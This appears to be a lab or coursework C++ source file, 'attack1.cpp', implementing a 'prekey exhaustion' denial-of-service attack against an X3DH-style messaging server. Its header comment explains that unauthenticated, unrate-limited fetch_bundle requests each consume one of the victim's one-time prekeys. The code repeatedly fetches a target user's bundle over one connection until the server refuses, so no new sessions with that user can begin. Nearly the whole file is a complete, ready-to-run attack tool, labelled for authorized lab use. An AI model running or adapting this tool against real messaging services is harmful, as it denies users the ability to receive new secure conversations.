// attack1.cpp — Attack 1: one-time prekey exhaustion ("Prekey Pogo")
// -----------------------------------------------------------------------------
// A malicious, *ordinary* client (no special network position, no registration)
// drains a victim's one-time-prekey (OPK) inventory by spamming `fetch_bundle`.
//
// Why it works (observed against the lab, see report §4):
//   * Every `fetch_bundle` CONSUMES one OPK and the server reports the remaining
//     `count`. Consumption happens at *fetch* time, not when a session is actually
//     established — so an attacker never has to send a single message.
//   * `fetch_bundle` is UNAUTHENTICATED and UNRATE-LIMITED: anyone who can reach the
//     server can fetch any user's bundle, repeatedly, from one TCP connection.
//   * When the inventory hits zero the server stops returning a bundle entirely and
//     replies `{"type":"err","err":"no one-time prekeys available for <user>"}`.
//     Because the server refuses the whole bundle (not just the OPK), NO new
//     initiator can start a session with the victim — a full new-session DoS that
//     lasts until the victim comes online and republishes. (Bob is offline in the
//     Attack-1 scenario, so he cannot replenish.)
//
// This is the X3DH analogue of a resource-exhaustion DoS: OPKs are a *handshake*
// resource, finite per publish, and nothing binds their consumption to a real
// session attempt.
//
// Build:  g++ -O2 -std=c++17 -o attack1 attack1.cpp -lpthread
// Run:    ./attack1 --server as3_server:9000 --target bob
//         ./attack1 --server as3_server:9000 --target bob --count 3   # drain only 3
//
// NOTE: for authorized use against the provided lab environment only.

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstring>
#include <iostream>
#include <regex>
#include <string>

namespace {

struct Opts {
    std::string server_host = "as3_server";
    int server_port = 9000;
    std::string target = "bob";
    long count = -1;  // -1 => drain until the server refuses (empty inventory)
};

bool parse_hostport(const std::string& s, std::string& host, int& port) {
    auto pos = s.rfind(':');
    if (pos == std::string::npos) return false;
    host = s.substr(0, pos);
    try {
        port = std::stoi(s.substr(pos + 1));
    } catch (...) {
        return false;
    }
    return true;
}

int dial(const std::string& host, int port) {
    addrinfo hints{};
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* res = nullptr;
    std::string port_s = std::to_string(port);
    if (getaddrinfo(host.c_str(), port_s.c_str(), &hints, &res) != 0 || !res) return -1;
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (fd < 0) {
        freeaddrinfo(res);
        return -1;
    }
    if (connect(fd, res->ai_addr, res->ai_addrlen) != 0) {
        close(fd);
        freeaddrinfo(res);
        return -1;
    }
    freeaddrinfo(res);
    return fd;
}

// Read one '\n'-terminated JSON line from fd, buffering across recv() calls.
bool read_line(int fd, std::string& buf, std::string& line) {
    size_t nl;
    while ((nl = buf.find('\n')) == std::string::npos) {
        char chunk[8192];
        ssize_t r = recv(fd, chunk, sizeof(chunk), 0);
        if (r <= 0) return false;
        buf.append(chunk, static_cast<size_t>(r));
    }
    line = buf.substr(0, nl);
    buf.erase(0, nl + 1);
    return true;
}

// Minimal field extraction from a flat JSON response (good enough for this wire).
std::string json_str(const std::string& s, const std::string& key) {
    std::regex re("\"" + key + "\":\"([^\"]*)\"");
    std::smatch m;
    if (std::regex_search(s, m, re)) return m[1].str();
    return "";
}
long json_int(const std::string& s, const std::string& key, long def) {
    std::regex re("\"" + key + "\":(-?\\d+)");
    std::smatch m;
    if (std::regex_search(s, m, re)) {
        try {
            return std::stol(m[1].str());
        } catch (...) {
        }
    }
    return def;
}

Opts parse_args(int argc, char** argv) {
    Opts o;
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto next = [&](const char* name) -> std::string {
            if (i + 1 >= argc) {
                std::cerr << "missing value for " << name << "\n";
                std::exit(2);
            }
            return argv[++i];
        };
        if (a == "--server") {
            parse_hostport(next("--server"), o.server_host, o.server_port);
        } else if (a == "--target") {
            o.target = next("--target");
        } else if (a == "--count") {
            o.count = std::stol(next("--count"));
        } else if (a == "-h" || a == "--help") {
            std::cout << "usage: attack1 --server H:P --target USER [--count N]\n"
                      << "  drains USER's one-time prekeys via repeated fetch_bundle\n"
                      << "  (default: drain until the server refuses)\n";
            std::exit(0);
        }
    }
    return o;
}

}  // namespace

int main(int argc, char** argv) {
    Opts o = parse_args(argc, argv);

    int fd = dial(o.server_host, o.server_port);
    if (fd < 0) {
        std::cerr << "[attack1] cannot reach server " << o.server_host << ":"
                  << o.server_port << "\n";
        return 1;
    }
    std::cerr << "[attack1] draining OPKs of '" << o.target << "' via fetch_bundle "
              << "(unauthenticated, one reused connection)\n";

    const std::string req =
        "{\"type\":\"fetch_bundle\",\"user\":\"" + o.target + "\"}\n";
    std::string buf;
    long drained = 0;
    bool refused = false;

    for (long i = 0; o.count < 0 || i < o.count; ++i) {
        if (send(fd, req.data(), req.size(), 0) < 0) {
            std::cerr << "[attack1] send failed after " << drained << " fetches\n";
            break;
        }
        std::string line;
        if (!read_line(fd, buf, line)) {
            std::cerr << "[attack1] connection closed by server after " << drained
                      << " fetches\n";
            break;
        }
        std::string type = json_str(line, "type");
        if (type == "bundle") {
            long opk_id = json_int(line, "opk_id", -1);
            long remaining = json_int(line, "count", -1);
            ++drained;
            std::cout << "fetch #" << drained << ": got OPK id=" << opk_id
                      << ", remaining count=" << remaining << "\n";
            if (remaining == 0) {
                // last OPK just handed out; inventory is now empty
            }
        } else {
            // err: inventory empty (or user unknown)
            std::cout << "fetch -> REFUSED: " << json_str(line, "err") << "\n";
            refused = true;
            break;
        }
    }

    // Confirm the denial-of-service: a fresh fetch (what a legitimate new initiator
    // like Alice would do) is now refused, so no new session can be established.
    if (o.count < 0 && !refused) {
        send(fd, req.data(), req.size(), 0);
        std::string line;
        if (read_line(fd, buf, line) && json_str(line, "type") == "err") {
            refused = true;
            std::cout << "confirm -> a legitimate initiator now gets: "
                      << json_str(line, "err") << "\n";
        }
    }

    std::cerr << "\n[attack1] summary: drained " << drained << " OPK(s) from '"
              << o.target << "'";
    if (refused) {
        std::cerr << "; inventory EMPTY -> new sessions with '" << o.target
                  << "' are now DENIED until it republishes.\n";
    } else {
        std::cerr << " (stopped early at --count).\n";
    }
    close(fd);
    return 0;
}
